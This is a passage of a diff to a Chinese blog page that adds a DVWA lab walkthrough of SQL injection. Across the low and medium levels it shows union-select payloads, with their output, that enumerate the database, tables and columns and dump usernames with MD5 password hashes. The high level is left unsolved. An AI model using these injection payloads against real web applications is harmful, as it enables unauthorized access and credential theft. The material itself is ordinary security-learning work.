class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: gordonb e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: 1337 8d3533d75ae2c3966d7e0d4fcc69216b</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ID: 1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat</span>(<span class="keyword">User</span>,<span class="string">' '</span>,<span class="keyword">Password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: pablo <span class="number">0</span>d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span><span class="string">' union select 1,concat(User,'</span> <span class="string">',Password) from users#</span></span><br><span class="line"><span class="string"> First name: 1</span></span><br><span class="line"><span class="string"> Surname: smithy 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 这样就暴出了用户名和密码</span></span><br></pre></td></tr></table></figure>
+<p>cancat()函数：concat(str1,str2,···)，连接一个或者多个字符串。   </p>
+<h2 id="Level：medium"><a href="#Level：medium" class="headerlink" title="Level：medium"></a>Level：medium</h2><h3 id="View-Source-1"><a href="#View-Source-1" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id"</span>;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于low等级，medium只多了一条语句：<code>$id = mysql_real_escape_string($id);</code>，很显然该题设置了一些过滤。<br>mysql_real_escape_string()函数：转义 SQL 语句字符串中的特殊字符，如输入单引号<code>&#39;</code>则处理时会在其前面加上反斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">字符</th>
+<th style="text-align:center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">\x00</td>
+<td style="text-align:center">空字符（null）</td>
+</tr>
+<tr>
+<td style="text-align:center">\n</td>
+<td style="text-align:center">换行</td>
+</tr>
+<tr>
+<td style="text-align:center">\r</td>
+<td style="text-align:center">回车</td>
+</tr>
+<tr>
+<td style="text-align:center">\</td>
+<td style="text-align:center">反斜杠</td>
+</tr>
+<tr>
+<td style="text-align:center">‘</td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center">‘’</td>
+<td style="text-align:center">双引号</td>
+</tr>
+<tr>
+<td style="text-align:center">\x1a</td>
+<td style="text-align:center">代替（substitute）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="判断注入点及类型-1"><a href="#判断注入点及类型-1" class="headerlink" title="判断注入点及类型"></a>判断注入点及类型</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入：1' or 1=1#</span></span><br><span class="line"> You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">'\' or 1=1#'</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入：1 or 1=1#</span></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Gordon</span><br><span class="line"> Surname: Brown</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Hack</span><br><span class="line"> Surname: Me</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Pablo</span><br><span class="line"> Surname: Picasso</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: Bob</span><br><span class="line"> Surname: Smith</span><br><span class="line"></span><br><span class="line">可以判断出这题是数字型注入，所以对单引号，双引号的过滤并没有多大影响。</span><br></pre></td></tr></table></figure>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>同样的方法，order by 或者 union select</p>
+<h3 id="union注入-1"><a href="#union注入-1" class="headerlink" title="union注入"></a>union注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#暴库</span></span><br><span class="line"> 输入：1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: dvwa</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴表</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: guestbook</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()</span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#暴字段</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: user_id</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: first_name</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: last_name</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="number">0x7573657273</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1</span></span><br><span class="line"> Surname: avatar</span><br><span class="line"></span><br><span class="line"><span class="comment">#暴数据</span></span><br><span class="line"> 输入：<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="keyword">admin</span></span><br><span class="line"> Surname: <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: gordonb</span><br><span class="line"> Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: <span class="number">1337</span></span><br><span class="line"> Surname: <span class="number">8</span>d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: pablo</span><br><span class="line"> Surname: <span class="number">0</span>d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line"> <span class="keyword">ID</span>: <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"> <span class="keyword">First</span> <span class="keyword">name</span>: smithy</span><br><span class="line"> Surname: <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure>
+<h2 id="Level：high"><a href="#Level：high" class="headerlink" title="Level：high"></a>Level：high</h2><h3 id="View-Source-2"><a href="#View-Source-2" class="headerlink" title="View Source"></a>View Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SQL Injection Source</span><br><span class="line"><span class="meta">&lt;?php</span>     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">        $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">            $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比于 medium ，high 多了一条语句：<code>$id = stripslashes($id);</code>，还有一个if语句。    </p>
+<ol>
+<li><p>stripslashes()函数：反引用一个字符串，返回一个去除转义反斜线后的字符串（\‘ 转换为 ‘ 等等）。双反斜线（\\）被转换为单个反斜线（\）。   </p>
+</li>
+<li><p>is_numeric()函数：检测变量是否为数字或数字字符串，是则返回 TRUE，否则返回 FALSE。   </p>
+</li>
+</ol>
+<p>这题太狠了，输入的只能是数字或数字字符串，还过滤了转义，绝了，不会！</p>
+<h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">or</span> <span class="string">'12'</span> = <span class="string">'12'</span>;</span><br><span class="line"><span class="comment">#当or之后的内容为true时会爆出表中的所有数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">or</span> <span class="string">'12'</span> = <span class="string">'1'</span>;</span><br><span class="line"><span class="comment">#当or之后的内容为false时会爆出表中id = 1的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'12'</span> = <span class="string">'12'</span>;</span><br><span class="line"><span class="comment">#当and之后的内容为true时会爆出表中id = 1的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'12'</span> = <span class="string">'1'</span>;</span><br><span class="line"><span class="comment">#当and之后的内容为false时则不会爆出数据</span></span><br></pre></td></tr></table></figure>
+<p>后面三点都比较好懂，我疑惑的是第一点为什么会爆出所有数据？希望有师父指点。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/23/数组返回NULL绕过/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -444,7 +860,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-24 20:05:44" itemprop="dateModified" datetime="2019-02-24T20:05:44+08:00">2019-02-24</time>
+                <time title="修改时间：2019-03-01 19:18:53" itemprop="dateModified" datetime="2019-03-01T19:18:53+08:00">2019-03-01</time>
               
             
           </span>
@@ -461,14 +877,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -638,7 +1054,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-23 15:52:37" itemprop="dateModified" datetime="2019-02-23T15:52:37+08:00">2019-02-23</time>
+                <time title="修改时间：2019-03-01 19:13:59" itemprop="dateModified" datetime="2019-03-01T19:13:59+08:00">2019-03-01</time>
               
             
           </span>
@@ -655,14 +1071,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -832,7 +1248,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-24 20:09:44" itemprop="dateModified" datetime="2019-02-24T20:09:44+08:00">2019-02-24</time>
+                <time title="修改时间：2019-03-01 19:13:42" itemprop="dateModified" datetime="2019-03-01T19:13:42+08:00">2019-03-01</time>
               
             
           </span>
@@ -849,14 +1265,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1026,7 +1442,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-23 12:26:07" itemprop="dateModified" datetime="2019-02-23T12:26:07+08:00">2019-02-23</time>
+                <time title="修改时间：2019-03-01 19:17:11" itemprop="dateModified" datetime="2019-03-01T19:17:11+08:00">2019-03-01</time>
               
             
           </span>
@@ -1043,14 +1459,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
                   ，
                 
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/BugkuCTF/" itemprop="url" rel="index"><span itemprop="name">BugkuCTF</span></a></span>
 
                 
                 
@@ -1218,7 +1634,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-02-23 15:07:06" itemprop="dateModified" datetime="2019-02-23T15:07:06+08:00">2019-02-23</time>
+                <time title="修改时间：2019-03-01 19:16:58" itemprop="dateModified" datetime="2019-03-01T19:16:58+08:00">2019-03-01</time>
               
             
           </span>
@@ -1235,14 +1651,14 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
